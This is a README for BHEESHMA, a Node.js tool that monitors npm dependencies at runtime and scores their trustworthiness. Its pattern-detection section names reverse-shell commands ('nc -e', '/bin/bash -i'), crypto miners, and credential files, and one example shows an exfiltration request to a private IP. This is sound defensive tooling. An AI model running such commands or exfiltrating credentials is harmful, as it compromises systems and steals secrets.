<div align="center">

# 🛡️ BHEESHMA

**Runtime Dependency Behavior Monitor for Node.js**

[![License](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Node.js Version](https://img.shields.io/badge/node-%3E%3D12.0.0-brightgreen.svg)](https://nodejs.org/)
[![Tests](https://img.shields.io/badge/tests-17%2F17%20passing-success.svg)]()
[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)

*Detect software supply-chain abuse at runtime by observing what third-party npm dependencies actually do.*

[Installation](#installation) • [Usage](#usage) • [Examples](#example-output) • [Documentation](#documentation)

</div>

---



Modern applications depend on hundreds of third-party npm packages. While static analysis and CVE scanning help, they cannot detect:

- **Zero-day malicious packages** not yet in vulnerability databases
- **Compromised legitimate packages** (e.g., event-stream, ua-parser-js incidents)
- **Dependency confusion attacks** that execute malicious code at install or runtime
- **Behavioral abuse** that doesn't match known CVE signatures

**Traditional tools tell you what dependencies _are_. BHEESHMA tells you what dependencies _do_.**

---

## What BHEESHMA Does

BHEESHMA is a **runtime behavioral security system** that monitors third-party npm dependencies for:

| Behavior | Risk | What It Detects |
|----------|------|------------------|
| **Environment Variable Access** | Medium | Credential theft, API key exfiltration |
| **File System Reads** | Low-Medium | Reconnaissance, credential file access |
| **File System Writes** | High | Persistence mechanisms, data exfiltration |
| **Network Connections** | Medium-High | Data exfiltration, C&C communication |
| **HTTP/HTTPS Requests** | Medium-High | Data exfiltration, suspicious service communication |
| **Shell Execution** | Critical | Arbitrary code execution, system compromise |

For each behavior, BHEESHMA captures:
- **Timestamp** (ISO 8601)
- **Behavior type**
- **Stack trace** (for attribution)
- **Attributed npm package** (name and version)
- **Metadata** (file path, host, command, etc.)

### Trust Scoring

BHEESHMA calculates a **deterministic trust score** [0-100] for each package based on observed behaviors:

- **80-100 (LOW risk)**: Minimal or benign behavior
- **60-79 (MEDIUM risk)**: Moderate activity, review recommended
- **30-59 (HIGH risk)**: Elevated activity, investigation required
- **0-29 (CRITICAL risk)**: Highly suspicious, immediate action needed

**Scoring is transparent and auditable** - no machine learning, no opacity.

---

## Installation

```bash
npm install -g bheeshma
```

Or use directly with `npx`:

```bash
npx bheeshma -- node your-app.js
```

---

## Usage

### CLI

Monitor any Node.js application:

```bash
bheeshma -- node app.js
```

Specify output format and file:

```bash
bheeshma --format json --output report.json -- node app.js
```

Run with npm scripts:

```bash
bheeshma -- npm test
```

### Programmatic API

#### Basic Usage

```javascript
const bheeshma = require('bheeshma');

// Initialize monitoring with default settings
bheeshma.init();

// Your application code runs here...
require('./your-app');

// Generate report
const report = bheeshma.generateReport('cli');
console.log(report);

// Or get structured data
const scores = bheeshma.getTrustScores();
const signals = bheeshma.getSignals();
```

#### Advanced Configuration

```javascript
// Initialize with custom configuration
bheeshma.init({
  config: {
    hooks: {
      http: true,  // Enable HTTP monitoring
      fs: true,    // Enable file system monitoring
      net: true,
      env: true,
      childProcess: true
    },
    riskWeights: {
      SHELL_EXEC: 25,      // Custom risk weight
      HTTP_REQUEST: 10
    },
    patterns: {
      enabled: true,
      detectCryptoMiners: true,
      detectDataExfiltration: true,
      detectBackdoors: true
    },
    whitelist: ["express@*"]  // Trusted packages
  }
});
```

#### Using Configuration Files

Create `.bheeshmarc.json` in your project root:

```json
{
  "hooks": {
    "http": true,
    "fs": true
  },
  "riskWeights": {
    "SHELL_EXEC": 25
  },
  "patterns": {
    "enabled": true
  },
  "whitelist": ["express@*"]
}
```

Then simply:

```javascript
bheeshma.init();  // Auto-loads .bheeshmarc.json
```

#### Pattern Detection

```javascript
const bheeshma = require('bheeshma');
const { analyzePatterns } = require('bheeshma/src/patterns/patternMatcher');

bheeshma.init({ config: { patterns: { enabled: true } } });

// Run your app
require('./your-app');

// Analyze for malicious patterns
const signals = bheeshma.getSignals();
const threats = analyzePatterns(signals, {
  enabled: true,
  detectCryptoMiners: true,
  detectDataExfiltration: true,
  detectBackdoors: true
});

console.log(`Detected ${threats.summary.totalThreats} threats`);
console.log(`Highest severity: ${threats.summary.highestSeverity}`);
```

#### Convenience Wrapper

```javascript
const bheeshma = require('bheeshma');

bheeshma.monitor(() => {
  // Your application code
  require('./your-app');
}, { format: 'json' })
  .then(({ result, report }) => {
    console.log(report);
  });
```

---

## Example Output

### CLI Format

```
======================================================================
  BHEESHMA Runtime Dependency Behavior Report
======================================================================

Summary:
  Total Packages Monitored: 3
  Total Signals Captured: 12

  Risk Distribution:
    HIGH: 1
    MEDIUM: 1
    LOW: 1

📦 suspicious-package@1.0.0
   Trust Score: 35/100 [HIGH]

   Observed Behaviors:
     🔐  ENV ACCESS: 5 occurrences
     📝  FS WRITE: 2 occurrences
     🌐  NET CONNECT: 1 occurrence
     ⚡  SHELL EXEC: 1 occurrence

📦 normal-package@2.1.0
   Trust Score: 85/100 [LOW]

   Observed Behaviors:
     📖  FS READ: 1 occurrence
```

### JSON Format

```json
{
  "version": "1.0",
  "timestamp": "2026-01-18T07:30:00.000Z",
  "summary": {
    "totalPackages": 2,
    "totalSignals": 9,
    "riskDistribution": {
      "critical": 0,
      "high": 1,
      "medium": 0,
      "low": 1
    }
  },
  "packages": [
    {
      "name": "suspicious-package",
      "version": "1.0.0",
      "trustScore": 35,
      "riskLevel": "HIGH",
      "signalCount": 9,
      "behaviors": {
        "ENV_ACCESS": 5,
        "FS_READ": 0,
        "FS_WRITE": 2,
        "SHELL_EXEC": 1,
        "NET_CONNECT": 1
      }
    }
  ],
  "signals": [ /* ... */ ]
}
```

---

## Security Guarantees

BHEESHMA is built with **security-first engineering principles**:

### Privacy & Independence
- ✅ **Zero telemetry** - No outbound communication
- ✅ **Local-only** - All processing happens on your machine
- ✅ **No cloud services** - No external dependencies
- ✅ **No persistent storage** - Data exists only in memory during runtime

### Safe Instrumentation
- ✅ **Non-invasive hooks** - Observes behavior without modifying it
- ✅ **Fail-safe** - Hook errors never break your application
- ✅ **Reversible** - Hooks can be cleanly uninstalled
- ✅ **Idempotent** - Safe to initialize multiple times

### Data Minimization
- ✅ **Metadata only** - Captures operation types and paths, never content
- ✅ **No secret capture** - Environment variable names only, never values
- ✅ **Sanitized commands** - Shell commands are redacted for common secrets
- ✅ **Sanitized headers** - HTTP headers are logged as [PRESENT] or [REDACTED], never full values
- ✅ **No body inspection** - Network payloads are never captured

---

## Advanced Features

### 🎯 Pattern Detection

BHEESHMA includes signature-based detection for common supply chain attack patterns:

#### Cryptocurrency Miners
- Detects known miner processes (xmrig, ethminer, cpuminer)
- Identifies mining pool connections
- Flags mining-related environment variables

#### Data Exfiltration
- Monitors access to sensitive files (`.npmrc`, `.env`, `.aws/credentials`, SSH keys)
- Detects connections to paste services (pastebin, webhook.site)
- **Correlation analysis**: Flags packages that read sensitive files AND make HTTP requests

#### Backdoors
- Identifies reverse shell patterns (`nc -e`, `/bin/bash -i`)
- Detects suspicious listening ports (1337, 4444, 31337)
- Flags remote access tools (ngrok, localtunnel)

#### Credential Theft
- Monitors access to secret environment variables (`AWS_ACCESS_KEY_ID`, `NPM_TOKEN`)
- Tracks reads of credential files

### 🌐 HTTP/HTTPS Monitoring

BHEESHMA intercepts all HTTP/HTTPS requests to detect:
- ✅ Direct IP address requests (bypassing DNS)
- ✅ Suspicious TLDs (.tk, .ml, .ga, .cf, .gq)
- ✅ Non-standard ports
- ✅ Pastebin-like services

**Example**:
```javascript
// Malicious package makes request
http.request('http://192.168.1.100:8080/exfil');

// BHEESHMA detects:
// - HTTP_REQUEST signal
// - isIpAddress: true
// - indicators: ["Direct IP request", "Non-standard port: 8080"]
```

### ⚙️ Configuration System

Customize BHEESHMA behavior without modifying code:

**Auto-discovery**: Place `.bheeshmarc.json` in your project root  
**Validation**: All config is validated to prevent malicious configurations  
**Flexible**: Enable/disable hooks, customize risk weights, whitelist packages

**Full Configuration Example**:
```json
{
  "hooks": {
    "env": true,
    "fs": true,
    "net": true,
    "childProcess": true,
    "http": true
  },
  "riskWeights": {
    "SHELL_EXEC": 20,
    "FS_WRITE": 10,
    "HTTP_REQUEST": 10,
    "HTTPS_REQUEST": 8,
    "NET_CONNECT": 8,
    "ENV_ACCESS": 5,
    "FS_READ": 3
  },
  "thresholds": {
    "critical": 30,
    "high": 60,
    "medium": 80
  },
  "whitelist": [
    "express@*",
    "@types/*"
  ],
  "blacklist": [],
  "patterns": {
    "enabled": true,
    "detectCryptoMiners": true,
    "detectDataExfiltration": true,
    "detectBackdoors": true,
    "detectObfuscation": true
  },
  "performance": {
    "track": false,
    "maxSignals": 10000
  },
  "output": {
    "formats": ["cli"],
    "verbosity": "normal",
    "includeStackTraces": true
  }
}
```

---

## Architecture

BHEESHMA follows a **layered security architecture**:

```
┌─────────────────────────────────────────────────┐
│              CLI / Programmatic API              │
└─────────────────────────────────────────────────┘
                        │
┌─────────────────────────────────────────────────┐
│              Output Formatters                   │
│           (CLI, JSON, CI/CD-ready)              │
└─────────────────────────────────────────────────┘
                        │
┌─────────────────────────────────────────────────┐
│           Trust Scoring Engine                   │
│        (Deterministic, Transparent)             │
└─────────────────────────────────────────────────┘
                        │
┌─────────────────────────────────────────────────┐
│          Signal Normalization Layer              │
│         (Immutable, Type-Safe)                  │
└─────────────────────────────────────────────────┘
                        │
┌─────────────────────────────────────────────────┐
│         Attribution Engine                       │
│      (Stack Trace → Package Mapping)            │
└─────────────────────────────────────────────────┘
                        │
┌─────────────────────────────────────────────────┐
│           Runtime Hooks                          │
│   (env, fs, net, http, https, child_process)   │
└─────────────────────────────────────────────────┘
                        │
┌─────────────────────────────────────────────────┐
│        Pattern Detection Engine                  │
│   (Crypto Miners, Data Exfiltration,           │
│     Backdoors, Credential Theft)                 │
└─────────────────────────────────────────────────┘
                        │
┌─────────────────────────────────────────────────┐
│          Configuration System                    │
│        (.bheeshmarc.json loader)                │
└─────────────────────────────────────────────────┘
```

### Design Principles

All code adheres to:
- **OWASP Secure Coding Practices** - Least privilege, fail-safe defaults
- **CERT/SEI Secure Coding** - Defensive programming, predictable errors
- **Node.js Security Best Practices** - Safe monkey-patching, no global pollution

---

## Development: Vibe Coding Meets Discipline

This project was built using **"vibe coding"** - AI-assisted rapid development - but with **uncompromising engineering discipline**:

| Approach | Benefit |
|----------|---------|
| **AI-assisted generation** | 10x faster prototyping and iteration |
| **Security-first prompts** | Every component explicitly follows OWASP/CERT principles |
| **Audit-ready comments** | Self-documenting code with security rationale |
| **Deterministic design** | No ML, no non-determinism, full transparency |

**The result**: Production-grade security tooling delivered with startup velocity.

This demonstrates that AI-assisted development can produce audit-ready, security-grade open source when guided by strong engineering discipline.

---

## Testing

BHEESHMA includes an **offline, deterministic test harness**:

```bash
npm test
```

Tests validate:
- ✅ Hook installation and teardown
- ✅ Benign dependency detection (high trust score)
- ✅ Suspicious dependency detection (low trust score)
- ✅ Signal capture for all behavior types
- ✅ Output format validity (CLI and JSON)

All tests run **without network access** and produce **deterministic results**.

---

## Limitations

BHEESHMA is **not**:
- ❌ A CVE scanner (use `npm audit` or Snyk)
- ❌ A static analysis tool (use ESLint security plugins)
- ❌ A silver bullet (defense-in-depth requires multiple layers)

BHEESHMA **cannot detect**:
- Runtime behaviors before hooks are installed (install early!)
- Native/C++ addons (Node.js internals only)
- Behaviors in worker threads (future work)
- Time bombs/delayed execution that occurs after monitoring stops

**Best Practice**: Use BHEESHMA as part of a layered security strategy alongside SCA, SAST, and dependency pinning.

---

## Roadmap

Completed:
- [x] Configuration system with validation
- [x] HTTP/HTTPS request monitoring
- [x] Advanced pattern detection (crypto miners, backdoors, data exfiltration)
- [x] Malware signature database

Future enhancements:
- [ ] HTML report generation
- [ ] Whitelist/blacklist enforcement
- [ ] ESM (ES Modules) full support
- [ ] Worker thread monitoring
- [ ] DNS query monitoring
- [ ] Crypto operation monitoring
- [ ] Policy enforcement mode (block high-risk packages)
- [ ] Real-time alerts (webhooks, Slack)
- [ ] Integration with popular CI/CD platforms

---

## Contributing

Contributions welcome! This project aims to be:
- **Audit-ready**: Every PR should maintain security-first coding standards
- **Well-documented**: Code comments explain security rationale
- **Test-covered**: New features need offline tests

See `CONTRIBUTING.md` for guidelines.

---

## License

**Apache License 2.0**

This project is licensed under the Apache License 2.0, which allows:
- ✅ Commercial use
- ✅ Modification and distribution
- ✅ Patent grant
- ✅ Private use

See [LICENSE](LICENSE) for full text.

---

## Credits

Built with discipline by security engineers who believe AI-assisted coding can produce production-grade software when guided by strong engineering principles.

**Security Frameworks Referenced**:
- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [CERT Secure Coding Standards](https://www.securecoding.cert.org/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)

---

## Support

- **Issues**: [GitHub Issues](https://github.com/yourusername/bheeshma/issues)
- **Discussions**: [GitHub Discussions](https://github.com/yourusername/bheeshma/discussions)
- **Security**: For security vulnerabilities, email vignesh4303@gmail.com

---

**BHEESHMA**: Trust, but verify. At runtime.
